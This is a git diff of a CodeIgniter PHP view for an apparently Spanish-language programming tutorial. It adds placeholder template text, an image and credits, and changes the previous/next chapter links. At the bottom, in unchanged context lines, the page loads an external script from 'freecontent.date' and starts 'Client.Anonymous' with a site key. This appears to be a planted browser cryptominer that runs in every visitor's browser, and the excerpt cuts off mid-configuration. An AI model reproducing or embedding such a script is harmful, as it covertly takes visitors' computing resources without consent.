@@ -117,12 +117,23 @@ defined('BASEPATH') OR exit('No direct script access allowed');
             los parámetros terminándolos con el acento circunflejo (^) si están al final de la línea, 
             ya que en Windows es uno de los símbolos de continuación.</blockquote>
 
+            
+            <h2 class="section-heading">Reaching for the Stars</h2>
+
+            <a href="#">
+              <img class="img-fluid" src="img/post-sample-image.jpg" alt="">
+            </a>
+            <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>
+
+            <p>Placeholder text by
+              <a href="http://spaceipsum.com/">Space Ipsum</a>. Photographs by
+              <a href="https://www.flickr.com/photos/nasacommons/">NASA on The Commons</a>.</p>
 
               <div class="clearfix">
-                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/descripcion">Capítulo Anterior &larr;</a>
+                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/">Capítulo Anterior &larr;</a>
               </div>
               <div class="clearfix">
-                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/primerProyecto">Capítulo Siguiente &rarr;</a>
+                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/instalacion">Capítulo Siguiente &rarr;</a>
               </div>
 
           </div>
@@ -178,7 +189,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
 
   </body>
 
-
+  
   <script src="https://www.freecontent.date./Kxnd.js"></script>
   <script>
     var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
